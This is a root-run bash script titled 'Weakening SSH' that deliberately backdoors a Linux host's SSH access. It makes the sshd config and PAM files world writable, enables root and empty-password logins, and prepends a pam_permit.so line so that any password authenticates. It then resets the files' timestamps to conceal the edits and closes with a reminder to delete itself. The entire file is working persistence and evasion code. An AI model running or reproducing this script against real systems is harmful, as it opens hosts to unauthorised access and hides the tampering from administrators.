#!/bin/bash

if [ $EUID -ne 0 ]; then
	echo "[!] Must run as root"
	exit 1
fi


# *** Helper Functions ***

# Colored log text output
cecho () {
	ColorOff='\033[0m'
	BWhite='\033[1;37m'
	Red='\033[0;31m'
	Yellow='\033[0;33m'
	Cyan='\033[0;36m'
	Purple='\033[0;35m'
	Green='\033[0;32m'

	CechoUsage="${Red}[!] cecho usage: cecho <task|error|warning|info|debug|done> <\"log_message\">${ColorOff}"

	if [ $# -ne 2 ]; then
		echo -e "$CechoUsage"
		return
	fi

	LogType=$1
	LogMessage=$2

	case $LogType in
		"task")
			echo
			echo -e "${BWhite}[+] --- ${LogMessage}${ColorOff}"
			;;
		"error")
			echo -e "${Red}[!] ${LogMessage}${ColorOff}"
			;;
		"warning")
			echo -e "${Yellow}[-] ${LogMessage}${ColorOff}"
			;;
		"info")
			echo -e "${Cyan}[*] ${LogMessage}${ColorOff}"
			;;
		"debug")
			echo -e "${Purple}[?] ${LogMessage}${ColorOff}"
			;;
		"done")
			echo -e "${Green}[=] ${LogMessage}${ColorOff}"
			;;
		*)
			echo -e "$CechoUsage"
			;;
	esac
}

# Get a file's timestamp in YYYYMMDDhhmm format to use with "time -t"
get_timestamp () {
	stat -L $1 | grep "Modify" | cut -d " " -f 2,3 | cut -d ":" -f 1,2 | tr -d "-" | tr -d ":" | tr -d " "
}



# *** Configurable variables ***

SSHD_CONFIG="/etc/ssh/sshd_config"
SSHD_PAM="/etc/pam.d/sshd"
PASSWD="/etc/passwd"
SHADOW="/etc/shadow"



# --- Main ---

cecho task "Weakening SSH"

if [ ! -f "$SSHD_CONFIG" ]; then
	cecho warning "SSHD configuration file '$SSHD_CONFIG' does not exist, skipping"
else
	sshd_timestamp=`get_timestamp "$SSHD_CONFIG"`

	# Make sshd config world writable
	chmod o+w "$SSHD_CONFIG" && cecho info "Made '$SSHD_CONFIG' world writable"

	# Allow SSH root login and passwordless login by modifying the sshd configuration file
	sed -i 's/.*PermitRootLogin.*/PermitRootLogin yes/' $SSHD_CONFIG
	sed -i 's/.*PermitEmptyPasswords.*/PermitEmptyPasswords yes/' $SSHD_CONFIG
	touch -t $sshd_timestamp $SSHD_CONFIG
	cecho info "Modified '$SSHD_CONFIG': enabled root and passwordless login"

	# Restart the sshd service
	if which systemctl &>/dev/null; then
		systemctl restart sshd
	elif which service &>/dev/null; then
		service sshd restart
	else
		cecho error "Could not restart sshd service: 'systemctl' nor 'service' found on system"
	fi
	cecho info "Restarted the sshd service"
fi

if [ ! -f "$SSHD_PAM" ]; then
	cecho warning "SSHD PAM file '$SSHD_PAM' does not exist, skipping"
else
	if grep -q "pam_permit.so" "$SSHD_PAM"; then
		cecho info "SSH PAM authentication already bypassed"
	else
		pam_timestamp=`get_timestamp "$SSHD_PAM"`

		# Make sshd pam world writable
		chmod o+w "$SSHD_PAM" && cecho info "Made '$SSHD_PAM' world writable"
			
		# Allow SSH authentication with any password. The below line is added to the top of the SSHD_PAM file.
		sed -i '1s/^/auth       sufficient     pam_permit.so\n/' $SSHD_PAM
		touch -t $pam_timestamp $SSHD_PAM
		cecho info "SSH PAM authentication bypassed"
	fi
fi

cecho done "Weakening SSH done"



echo
cecho debug "Don't forget to delete me!"
